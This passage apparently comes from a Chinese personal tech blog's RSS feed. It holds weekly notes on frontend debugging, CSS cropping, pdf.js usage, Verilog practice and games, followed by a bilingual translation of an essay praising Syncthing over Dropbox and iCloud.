&lt;p&gt;给 &lt;a href=&quot;https://github.com/openai-translator/openai-translator&quot;&gt;openai-translator&lt;/a&gt; 加 feature，但是遇到 useEffect 被调用两次的问题。几千行的 TSX 到处都是 &lt;code&gt;use{:js}&lt;/code&gt; 钩子，只好一顿 &lt;code&gt;console.log{:js}&lt;/code&gt;。最后发现是流式返回的结果会有两次停止的 signal，而这时会调用传入的闭包。加上一个是否已经停止的判断就好了。&lt;/p&gt;
&lt;h3&gt;Verilog&lt;/h3&gt;
&lt;p&gt;开始做 &lt;a href=&quot;https://hdlbits.01xz.net/wiki/Main_Page&quot;&gt;HDLBits&lt;/a&gt; 的题目。这是个 Verilog 的练习平台，不过感觉评测有些慢。我的题解在 &lt;a href=&quot;https://github.com/OverflowCat/hdlbits&quot;&gt;OverflowCat/hdlbits&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;对于 Verilog，VS Code 比较好用的 formatter 是 &lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=bmpenuelas.systemverilog-formatter-vscode&quot;&gt;SystemVerilog and Verilog Formatter&lt;/a&gt;（包名是 &amp;lt;code style=&amp;quot;word-break: break-all;&amp;quot;&amp;gt;bmpenuelas.systemverilog-formatter-vscode&amp;lt;/code&amp;gt;）。&lt;/p&gt;
&lt;h2&gt;我在玩什么&lt;/h2&gt;
&lt;h3&gt;八方旅人&lt;/h3&gt;
&lt;p&gt;打了部分角色的第二章，目前在智者峰（Mountwise）。解锁了「二人章节」，并且发现 Throné 的第二章有两部分。看来这部的内容还是挺多的。还剩下 Ochette 没有开始第一章，因为好像要选一个宠物，选择困难。&lt;/p&gt;
&lt;p&gt;这部的第二职业变化也很大。对于玩家的八个职业，需要取得许可证，最多三张，分别完成不同的任务。不过队伍中顶多有两个相同的职业，多了也没必要。&lt;/p&gt;
&lt;p&gt;从第一部开始就一直好奇英文配音角色在战斗结束后的配音那句都说了什么，有几个句子没听明白，查了 Reddit 也没找到。可能是台词比较怪异，比如：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;May the sacred flame guide you, or something like that.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;我在看什么&lt;/h2&gt;
&lt;h3&gt;只合把清浊分辨&lt;/h3&gt;
&lt;p&gt;&amp;lt;Bilibili client:load thumbnail=&amp;quot;https://user-images.githubusercontent.com/20166026/256911902-fd4f8ad9-4059-481f-8829-faa0255c68f7.jpg&amp;quot; bv=&amp;quot;BV1Nz4y1x7Aa&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;茅塞顿开：通过声音的波形图可以发现，汉语中爆破音的送气和不送气是通过音节前是否有一小段气流来区分的。而日语中，清浊音是通过音节前是否有一小段声带震动来区分的。我们可以通过与上一个元音前是否断开来区分清浊音：&lt;strong&gt;如果是浊音，那么上一个元音会和浊音连在一起；如果是清音，那么上一个元音后必然会断开，相当于一个很短的促音「っ」。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;视频中推荐的 &lt;a href=&quot;https://github.com/praat/praat&quot;&gt;praat&lt;/a&gt; 和 &lt;a href=&quot;http://nihongo.hum.tmu.ac.jp/mic-j/VoAspNew&quot;&gt;东京都立大学的清浊音练习&lt;/a&gt; 也很好。&lt;/p&gt;
</content:encoded></item><item><title>自新世界 #0x01：少女周末旅行</title><link>https://blog.xinshijiededa.men/weekly/0x01/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/weekly/0x01/</guid><description>为了记录自己的精神状态，我决定开始写周报。</description><pubDate>Tue, 18 Jul 2023 23:50:00 GMT</pubDate><content:encoded>&lt;p&gt;import Bilibili from &amp;quot;@/components/Bilibili.svelte&amp;quot;;
import Pn from &amp;quot;@/components/Pn.astro&amp;quot;;
import { YouTube } from &amp;quot;@astro-community/astro-embed-youtube&amp;quot;;&lt;/p&gt;
&lt;p&gt;&amp;lt;script src=&amp;quot;/scripts/jxl/jxl.min.js&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;为了记录自己的精神状态，我决定开始写周报。说是周报，但不保证每周都会写，也不保证内容的跨度刚好是一周。名称来源于交响曲 &amp;lt;i lang=&amp;quot;cs&amp;quot;&amp;gt;Z nového světa&amp;lt;/i&amp;gt;。&lt;/p&gt;
&lt;h2&gt;我在写什么&lt;/h2&gt;
&lt;p&gt;这周 Wakatime 时长 40 小时，时间都花在了重构博客和折腾 pdf.js 上。&lt;/p&gt;
&lt;p&gt;重构博客用了 Astro，之后会写一篇文章锐评一下。&lt;/p&gt;
&lt;h3&gt;CSS 如何裁剪一个元素&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./css-1.png&quot; alt=&quot;想要实现的效果&quot;&gt;&lt;/p&gt;
&lt;p&gt;在 CSS 中，如果我们想要使一个元素只显示一部分，可以通过设置 parent 元素 &lt;code&gt;.parent {position: relative;}{:css}&lt;/code&gt;、child 元素 &lt;code&gt;.child {position: absolute;}{:css}&lt;/code&gt; 来实现。（tribute to @&amp;lt;Pn&amp;gt;魔法小猫&amp;lt;/Pn&amp;gt;）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./css-2.png&quot; alt=&quot;原理&quot;&gt;&lt;/p&gt;
&lt;p&gt;不过是次的情况有些棘手：child 是两个元素，其中一个元素 A 在另一个元素 B 之上，设置了 &lt;code&gt;z-index{:css}&lt;/code&gt;。这导致即使 parent 设置更高的 &lt;code&gt;z-index{:css}&lt;/code&gt;，也无法覆盖掉 child 的 A。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./css-3.png&quot; alt=&quot;错误的效果&quot;&gt;&lt;/p&gt;
&lt;p&gt;正确的做法是，不要设置 A 元素的 &lt;code&gt;z-index{:css}&lt;/code&gt;，而是加一层 wrapper，并且将 A 和 B 都采用 absolute 定位来实现层级的效果。这样就不会出现上述的问题了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./css-4.png&quot; alt=&quot;正确的效果&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;p class=&amp;quot;codepen&amp;quot; data-height=&amp;quot;300&amp;quot; data-default-tab=&amp;quot;html,result&amp;quot; data-slug-hash=&amp;quot;xxQYEaW&amp;quot; data-user=&amp;quot;overflowcat&amp;quot; style=&amp;quot;height: 300px; box-sizing: border-box; display: flex; align-items: center; justify-content: center; border: 2px solid; margin: 1em 0; padding: 1em;&amp;quot;&amp;gt;
&amp;lt;span&amp;gt;See the Pen &amp;lt;a href=&amp;quot;https://codepen.io/overflowcat/pen/xxQYEaW&amp;quot;&amp;gt;
Crop-component&amp;lt;/a&amp;gt; by Overflow Cat (&amp;lt;a href=&amp;quot;https://codepen.io/overflowcat&amp;quot;&amp;gt;@overflowcat&amp;lt;/a&amp;gt;)
on &amp;lt;a href=&amp;quot;https://codepen.io&amp;quot;&amp;gt;CodePen&amp;lt;/a&amp;gt;.&amp;lt;/span&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;script async src=&amp;quot;https://cpwebassets.codepen.io/assets/embed/ei.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/p&gt;
&lt;h3&gt;Svelte 4&lt;/h3&gt;
&lt;p&gt;Svelte 4 创建新项目只能选 SvelteKit / library 了，library 里还带一个 SvelteKit。虽然声称支持 SPA，但是&lt;a href=&quot;https://github.com/sveltejs/kit/issues/7443&quot;&gt;不支持 hash-based routing&lt;/a&gt;，这样你就用不了它的路由了。第三方库也只支持到 Svelte 3。而且 Svelte 4 的空白项目直接加入 SSG 的 adapter 还会报错，无法 build，貌似是里面有动态 endpoint。而且报错甚至倒退了，出错常常 trace 不到我的代码中。&lt;/p&gt;
&lt;p&gt;React 最近也在推 RSC，文档中一上来展示了 4 个不同的框架（包括 Expo 什么的），要是初学者的话真的会被吓住。真是恶心它妈给恶心开门。&lt;/p&gt;
&lt;h3&gt;pdf.js&lt;/h3&gt;
&lt;p&gt;pdf.js 分为 3 个层级：Core，Display，Viewer。Display 提供了渲染 canvas 和文字层的功能，Viewer 则是 Firefox 那个带控件的 PDF 阅读器。尝试使用 Viewer，但是始终无法使它正常工作。&lt;/p&gt;
&lt;p&gt;Display 层中可选择的文字是由 &lt;code&gt;textLayer{:css}&lt;/code&gt; 层提供的。使用方式也很扭曲，有几个注意事项：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;导入的方式是 &lt;code&gt;import type { PageViewport } from &apos;pdfjs-dist&apos;;{:ts}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;需要设置 worker（不知道如何从包导入）：&lt;pre&gt;&lt;code class=&quot;language-ts&quot;&gt;pdfjsLib.GlobalWorkerOptions.workerSrc = `//cdnjs.cloudflare.com/ajax/libs/pdf.js/${pdfjsLib.version}/pdf.worker.js`;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;页面的坐标原点在左下角。典型的 PDF 文件的大小为 $612 \times 792$&lt;/li&gt;
&lt;li&gt;需要引入 &lt;code&gt;textLayer{:css}&lt;/code&gt; 的 CSS：&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;link
    href=&amp;quot;https://cdn.jsdelivr.net/npm/pdfjs-dist@3.8.162/web/pdf_viewer.min.css&amp;quot;
    rel=&amp;quot;stylesheet&amp;quot;
/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;需要在渲染 &lt;code&gt;textLayer{:css}&lt;/code&gt; 前设置 CSS 变量 &lt;code&gt;--scale-factor{:css}&lt;/code&gt; 使 &lt;code&gt;textLayer{:css}&lt;/code&gt; 缩放与 canvas 一致。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;textLayer{:css}&lt;/code&gt; 的默认 CSS 还设置了 &lt;code&gt;opacity: 0.25{:css}&lt;/code&gt;，我建议覆盖掉，然后直接设置高亮颜色的透明度。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;pdf.js 开发的困难之处还在于其提供的 API 少得可怜。比如，想要获得用户的选择，只能通过和 HTML 一样的方式来实现，即 &lt;code&gt;window.getSelection(){:js}&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这周的成果如下：&lt;/p&gt;
&lt;p&gt;&amp;lt;video src=&amp;quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/weekly/0x01/Pdfdemo.mp4&amp;quot; autoplay controls&amp;gt;&amp;lt;/video&amp;gt;&lt;/p&gt;
&lt;h2&gt;我在玩什么&lt;/h2&gt;
&lt;h3&gt;八方旅人Ⅱ&lt;/h3&gt;
&lt;p&gt;这周照例是玩《&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E6%AD%A7%E8%B7%AF%E6%97%85%E4%BA%BAII&quot;&gt;八方旅人Ⅱ&lt;/a&gt;》。与第一作相比，这一作的每章节内容多寡分配得不是十分均匀。比如 Osvald 的前两章都是回忆，而 Throné 的第二章很短，还没有战斗。不过，类似观影的剧情多了起来，颇有以前 66RPG（奠）中「&lt;a href=&quot;https://cowlevel.net/question/1873716&quot;&gt;R 剧&lt;/a&gt;」的味道。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/weekly/0x01/20230709071619_1.jxl&quot; alt=&quot;Hikari, the Warrior&quot;&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/weekly/0x01/20230712053314_1.jxl&quot; alt=&quot;Partitio, the Merchant&quot;&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/weekly/0x01/20230715134007_1.jxl&quot; alt=&quot;Agnea, the Dancer&quot;&gt;&lt;/p&gt;
&lt;h3&gt;LunarVim&lt;/h3&gt;
&lt;p&gt;尝试了下 LunarVim。文档里只说了加了哪些插件，但没有一个快速上手的教程，我都不知道它包管理器用的哪个。&lt;/p&gt;
&lt;h2&gt;我在看什么&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/642001589&quot;&gt;为啥你数学没有更强&lt;/a&gt;（&lt;a href=&quot;https://wiki.issarice.com/wiki/Why_ain%27tcha_better_at_math&quot;&gt;&amp;lt;i&amp;gt;Why ain&apos;tcha better at math&amp;lt;/i&amp;gt;&lt;/a&gt;）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;然而，我认为我的基本观点是好的。如果我的方法有任何价值，那么使用它的人应该能够学习并记住重要的东西。事实上，我对那些热衷于生产力/生活黑客的人有这样的批评：如果你的「记笔记方法/学习方法/待办事项列表系统/生活方式/无论什么」真的那么好，那么，你的成果是什么呢？你用它做了什么？所以我确实觉得我需要证明我在数学方面很好/过得去，不一定是从常规的角度，但至少是从某些特殊的角度上说，我对之感到满意，且任何一个公道的人都会对之满意。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;I tried 8 different Postgres ORMs&lt;/h3&gt;
&lt;p&gt;&amp;lt;YouTube id=&amp;quot;https://www.youtube.com/watch?v=4QN1BzxF8wM&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;FireShip 的视频质量一如既往地高。看下来还是 Prisma 最好。去年用过一次，但是当时用的 SQLite，没体会出它的好处，现在用 PostgreSQL，migration 就很方便了。&lt;/p&gt;
&lt;hr&gt;
&lt;h3&gt;番剧&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;[x] &lt;strong&gt;【推しの子】&lt;/strong&gt; EP11&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&amp;lt;Bilibili client:load bv=&amp;quot;BV1PV411T7yG&amp;quot; thumbnail=&amp;quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/weekly/0x01/少女周末旅行.webp&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;p lang=&amp;quot;ja&amp;quot;&amp;gt;作りましょう　作りましょう&amp;lt;br /&amp;gt;
あなたと私の世界をさぁ作りましょう&amp;lt;br /&amp;gt;
始めましょう　始めましょう&amp;lt;br /&amp;gt;
なにから始めましょう（ん～！？）&amp;lt;br /&amp;gt;
踊りましょう　踊りましょう&amp;lt;br /&amp;gt;
ノリノリで踊りましょう（イェイ　イェイ）&amp;lt;br /&amp;gt;
しゅうまつ旅行がはじまるぞ！&amp;lt;br /&amp;gt;&amp;lt;/p&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>计算机，我曾经喜欢的样子</title><link>https://blog.xinshijiededa.men/syncthing/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/syncthing/</guid><description>Syncthing 是我过去喜欢的计算机的一切。</description><pubDate>Tue, 18 Jul 2023 04:36:00 GMT</pubDate><content:encoded>&lt;p&gt;import &amp;quot;@/styles/tonsky-fig-old.less&amp;quot;;&lt;/p&gt;
&lt;h1&gt;计算机，我曾经喜欢的样子&lt;/h1&gt;
&lt;p&gt;&amp;lt;div style=&amp;quot;font-size: 150%; text-align: left; font-weight: 600;&amp;quot;&amp;gt;
Computers as I used to love them
&amp;lt;/div&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;address style=&amp;quot;text-align: right; margin-bottom: .7em;&amp;quot;&amp;gt;
作者：&amp;lt;a href=&amp;quot;https://tonsky.me/&amp;quot; rel=&amp;quot;author&amp;quot;&amp;gt;&amp;lt;strong&amp;gt;Nikita&amp;lt;/strong&amp;gt;&amp;lt;/a&amp;gt; (@tonsky)
&amp;lt;/address&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/tonsky/syncthing.webp&quot; alt=&quot;Illustration by Yulia Prokopova&quot;&gt;&lt;/p&gt;
&lt;p&gt;I’ve been struggling with file sync solutions &lt;a href=&quot;https://tonsky.livejournal.com/323469.html&quot;&gt;for years&lt;/a&gt;. In the beginning, Dropbox was great, but in the last few years, they started to bloat up. I moved to iCloud, but it was even worse. Finally, a few days ago, after iCloud &lt;a href=&quot;https://twitter.com/nikitonsky/status/1269741673715810304&quot;&gt;cryptically broke again&lt;/a&gt;, I decided it’s time to try something different.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://tonsky.livejournal.com/323469.html&quot;&gt;多年来&lt;/a&gt;，我一直苦于文件同步解决方案。起初，Dropbox 很棒，但在过去的几年中，他们开始膨胀。我转向了 iCloud，但它甚至更糟。终于，在几天前 iCloud &lt;a href=&quot;https://twitter.com/nikitonsky/status/1269741673715810304&quot;&gt;再度神秘崩溃&lt;/a&gt;后，我觉得是时候该尝试一些不一样的东西了。&lt;/p&gt;
&lt;p&gt;I tried &lt;a href=&quot;https://syncthing.net/&quot;&gt;Syncthing&lt;/a&gt;, a free and open-source alternative. And you know what? It’s been liberating. The sanity, the simplicity, the reliability, the features. It brings the joy of use and makes you believe &lt;a href=&quot;https://tonsky.me/blog/good-times-weak-men/&quot;&gt;the collapse of civilization&lt;/a&gt; can be slowed down a bit.&lt;/p&gt;
&lt;p&gt;我试了 &lt;a href=&quot;https://syncthing.net/&quot;&gt;Syncthing&lt;/a&gt;，一个免费的开源替代品。你知道吗？这是一种解放。它的理智、简洁、可靠性和功能都让人愉悦。它带来了使用的乐趣，让你相信&lt;a href=&quot;https://tonsky.me/blog/good-times-weak-men/&quot;&gt;文明的崩溃&lt;/a&gt;可以减缓一点。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Syncthing is everything I used to love about computers.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;p lang=&amp;quot;zh&amp;quot;&amp;gt;
&amp;lt;strong&amp;gt;Syncthing 是我过去喜欢的计算机的一切。&amp;lt;/strong&amp;gt;
&amp;lt;/p&amp;gt;&lt;/p&gt;
&lt;p&gt;It’s amazing how great computer products can be when they don’t need to deal with corporate bullshit, don’t have to promote a brand or to sell its users. Frankly, I almost ceased to believe it’s still possible. But it is.&lt;/p&gt;
&lt;p&gt;真是令人惊讶——计算机产品在不需要处理公司的废话、不需要推广品牌或出售用户时，它们可以有多好。坦率地说，我几乎不再相信这仍然是可能的。但是它确实是这样。&lt;/p&gt;
&lt;p&gt;{/* ## Installation */}&lt;/p&gt;
&lt;h2&gt;安装&lt;/h2&gt;
&lt;p&gt;You download a single binary executable. You run it. There’s no step three.&lt;/p&gt;
&lt;p&gt;下载一个二进制可执行文件。然后运行。没有第三步。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/cli.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;No, seriously. It’s so simple I thought I missed something. But no. After you run that binary, you have a fully operational node of Syncthing. It’s ready to sync with any other Syncthing node, no other setup necessary. There’s no installers, no package management (but there are packages if you want to), no registration, no email, no logins, no password creation, no 2FA, no consents, no user agreements. Just download and run. Heck, setting up autostart on Linux server was more complex than just running the app itself!&lt;/p&gt;
&lt;p&gt;不，认真地。它简单到我以为我错过了什么，但没有。在运行该二进制文件之后，你就有了一个全面运作的 Syncthing 节点。它已准备好与任何其他 Syncthing 节点同步，无需其他设置。没有安装程序，无需包管理（但如果你想的话有包），无需注册，无需电子邮件，无需登录，无需密码创建，无需两步验证，不用同意条款，没有用户协议。只用下载和运行。见鬼，设置在 Linux 服务器上的自动启动比运行应用程序本身更复杂！&lt;/p&gt;
&lt;p&gt;Homebrew makes it even simpler:&lt;/p&gt;
&lt;p&gt;Homebrew 让这件事甚至更简单：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/homebrew.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;Just to give you the perspective, these are all the steps that Dropbox puts you through when you install it on a new computer:&lt;/p&gt;
&lt;p&gt;只是为了让你有个对比，这些是当你在一台新电脑上安装 Dropbox 时会经历的所有步骤：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/tonsky/dropbox_1.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/tonsky/dropbox_2.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/tonsky/dropbox_3.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/tonsky/dropbox_4.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/dropbox_5.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/tonsky/dropbox_6.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/tonsky/dropbox_7.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/tonsky/dropbox_8.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/tonsky/dropbox_9.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/dropbox_10.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/tonsky/dropbox_11.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;Aaaaand… that’s not all! You also get this annoying notification to deal with:&lt;/p&gt;
&lt;p&gt;还还还还有……这还不是全部！你还会收到这个烦人的通知：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/dropbox_12.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;Only at this point can you start using Dropbox. Luckily, I already had an account, otherwise, it would be 5 more steps. Ridiculous!&lt;/p&gt;
&lt;p&gt;只有在这个时候你才能开始使用 Dropbox。要是我没有注册过账户的话，还会有另外的五个步骤。荒谬！&lt;/p&gt;
&lt;p&gt;(It goes without saying, that all of these are different windows. It does not happen in a single predictable area, mind you. You have to chase every one of them. And the “Set Up Dropbox” window is always-on-top, so it hides other required steps, which also adds to the fun.)&lt;/p&gt;
&lt;p&gt;（不消说，这些都是不同的窗口。提醒你一下，它们不会出现在同一个可预测的区域。你必须追着它们的每一个。而且「设置 Dropbox」窗口总是在最上面，所以它会隐藏其他必需的步骤，这也增添了个中乐趣。）&lt;/p&gt;
&lt;p&gt;{/* ## No artificial limits */}&lt;/p&gt;
&lt;h2&gt;没有人为的限制&lt;/h2&gt;
&lt;p&gt;Because Synthing is free and doesn’t depend on server-side storage, they don’t need to put weird or unnatural restrictions on you. You can use as much space as you have on disk. You can sync as many folders as you want. You can sync any folder, no matter where it’s located. You can sync with anyone in the world. In fact, you can sync any folder with any number of people. At no point have you to wonder “but will it work with my plan”? If your hardware allows it, it will work. As simple as that.&lt;/p&gt;
&lt;p&gt;因为 Syncthing 是免费的，而且不依赖于服务端存储，所以他们不需要对你施加奇怪或不自然的限制。你可以使用磁盘上的任意空间。你可以同步任意数量的文件夹。你可以同步任何文件夹，无论它们位于何处。你可以与世界上的任何人同步。事实上，你可以将任何文件夹与任何数量的人同步。你不必担心「但它能与我的套餐一起工作吗」？如果你的硬件允许，那它就会工作。就这么简单。&lt;/p&gt;
&lt;p&gt;Folders are the most vivid example of how other cloud storages constantly fuck up the simplest things. Syncthing can sync any folder on your drive, located anywhere. You can sync existing folders. You can sync multiple different folders. &lt;em&gt;Folders are just folders&lt;/em&gt;, nothing special about them. Here I’m syncing “system” folders: &lt;code&gt;~/Desktop&lt;/code&gt; and &lt;code&gt;~/Library/Fonts&lt;/code&gt;, and three custom ones. No sweat:&lt;/p&gt;
&lt;p&gt;文件夹是其他云存储如何不断搞砸最简单的事情的最生动的例子。Syncthing 可以同步任何你设备上的文件夹，不论它们的位置在哪。你可以同步已有的文件夹。你可以同步多个不同的文件夹。&lt;strong&gt;文件夹就是文件夹&lt;/strong&gt;，没有什么特别的。这里我在同步「系统」文件夹：&lt;code&gt;~/Desktop&lt;/code&gt; 和 &lt;code&gt;~/Library/Fonts&lt;/code&gt;，以及三个自定义的文件夹。毫不费力：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/folders.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;This simplicity lets you use it as a tool you can apply, sometimes creatively, to your task, not as a service you have to put up with. For example, by syncing &lt;code&gt;~/Library/Fonts&lt;/code&gt;, if I install a font on one machine, it automatically installs everywhere.&lt;/p&gt;
&lt;p&gt;这种简洁让你能将它作为一个有时可以创造性地应用到任务上的工具来为你所用，而非一个不得不忍受的服务。例如，如果同步了 &lt;code&gt;~/Library/Fonts&lt;/code&gt;，那么我在一台电脑上安装了一个字体，每台电脑上都会自动安装这个字体。&lt;/p&gt;
&lt;p&gt;Contrast this with Dropbox, which requires you to put everything inside &lt;code&gt;~/Dropbox&lt;/code&gt; folder. If you keep your projects under &lt;code&gt;~/work&lt;/code&gt; and want to sync it, well, tough luck. You can’t sync multiple folders either. Well, technically Dropbox can sync anything, of course. Files are files. But branding dictates there MUST be a Dropbox folder somewhere, even if it’s inconvenient for the user.&lt;/p&gt;
&lt;p&gt;Dropbox 与之相比，要求你将所有东西都放在 &lt;code&gt;~/Dropbox&lt;/code&gt; 文件夹中。如果你将你的项目放在 &lt;code&gt;~/work&lt;/code&gt; 下并想要同步它，呃，那可就运气不好了。你也不能同步多个文件夹。当然，从技术上讲 Dropbox 可以同步任何东西。文件就是文件。但品牌营销决定了&lt;em&gt;必须&lt;/em&gt;有一个 Dropbox 文件夹，即使对用户来说这是不方便的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/dropbox_folder.png&quot; alt=&quot;甜甜的品牌营销……&quot;&gt;&lt;/p&gt;
&lt;p&gt;But the worst offender is the iCloud. Same as Dropbox, it also requires you to put all your stuff into a folder. But that folder is called &lt;code&gt;~/Library/Mobile Documents/com~apple~CloudDocs&lt;/code&gt;!!!&lt;/p&gt;
&lt;p&gt;但最糟糕的是 iCloud。和 Dropbox 一样，它也要求你把所有的东西都放在一个文件夹里。但是这个文件夹叫做 &lt;code&gt;~/Library/Mobile Documents/com~apple~CloudDocs&lt;/code&gt;！！！&lt;/p&gt;
&lt;p&gt;If you are a programmer, it’s unusable. First, you can’t in your right mind type THAT every time you need to &lt;code&gt;cd&lt;/code&gt;. Second, it contains spaces! Which breaks all sorts of things, believe me or not, even in 2020. I can’t keep Fira Code in iCloud because of python scripts, I can’t keep Jekyll blog like this one there because of Ruby, I can’t run bazel, etc. Useless.&lt;/p&gt;
&lt;p&gt;这对于程序员来说是用不了的。首先，你不可能在正常的心智状态下每次需要 &lt;code&gt;cd&lt;/code&gt; 时都输入&lt;em&gt;那个玩意&amp;lt;small&amp;gt;儿&amp;lt;/small&amp;gt;&lt;/em&gt;。第二，它包含空格！爱信不信，即使是在 2020 年，这也会破坏各种东西。因为里面有 Python 脚本，所以我不能在 iCloud 中保留 Fira Code；因为 Ruby 我不能在那里保留像这个博客一样的 Jekyll 博客。我还不能运行 bazel……。一无是处。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/jekyll.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;And if you think symlinking it to &lt;code&gt;~/icloud&lt;/code&gt; helps, believe me, it does not.&lt;/p&gt;
&lt;p&gt;并且，如果你觉得将它软链接到 &lt;code&gt;~/icloud&lt;/code&gt; 会有所帮助，相信我，它不会。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/absolute_path.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;{/* ## No registration */}&lt;/p&gt;
&lt;h2&gt;不用注册&lt;/h2&gt;
&lt;p&gt;How do you connect two devices, if there’s no registration, accounts, email, etc? Simple! Each device has a unique id, generated automatically when you first run the program. Share this id with another device, let them share their, and you are good to go.&lt;/p&gt;
&lt;p&gt;如果没有注册、账户、电子邮件这些方式，你会如何连接两个设备？很简单！每个设备都有一个唯一的 id，在你第一次运行程序时自动生成。与另一个设备共享这个 id，让另一个设备共享它的 id，然后你就可以开始了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/id.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;Best news? Those ids are not even secret. They are more like public keys, so you can exchange them freely. But the scheme only works if both devices know ids of each other.&lt;/p&gt;
&lt;p&gt;最好的消息？这些 id 甚至不是密钥。它们更像是公钥，所以你可以自由地交换它们。但是，只有当两个设备都知道对方的 id 时，这个方案才能起作用。&lt;/p&gt;
&lt;p&gt;What I like about this scheme is how beautifully simple and down-to-absolute-essentials it is. This is pure mathematics. But it’s also very convenient to use. There’re no emails, no forms, no unresponsive web pages, no invites, no expiring tokens, no failing/outdated/overloaded APIs, no password management, nothing to hold onto or “manage”.&lt;/p&gt;
&lt;p&gt;我喜欢这个方案的地方在于它是如此地简单和绝对地基础。这是纯数学，但也很便于使用。没有电子邮件，没有表格，没有无响应的网页，没有邀请，没有过期的令牌，没有失败/过时/过载的 API，没有密码管理，没有什么需要守着不放或「管理」的地方。&lt;/p&gt;
&lt;p&gt;{/* ## Power mode */}&lt;/p&gt;
&lt;h2&gt;高级模式&lt;/h2&gt;
&lt;p&gt;There’s power user mode! If you don’t care, there’s always a UI, and most of the things you can configure there. But if you’re a programmer and need more, you can:&lt;/p&gt;
&lt;p&gt;还有有高级用户模式！如果你不需要的话，Syncthing 也总是有图形界面，大多数事情你可以在那里配置。但是如果你是一个程序员，需要更多的功能，你可以：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Install Synthing on a headless Linux server,&lt;/li&gt;
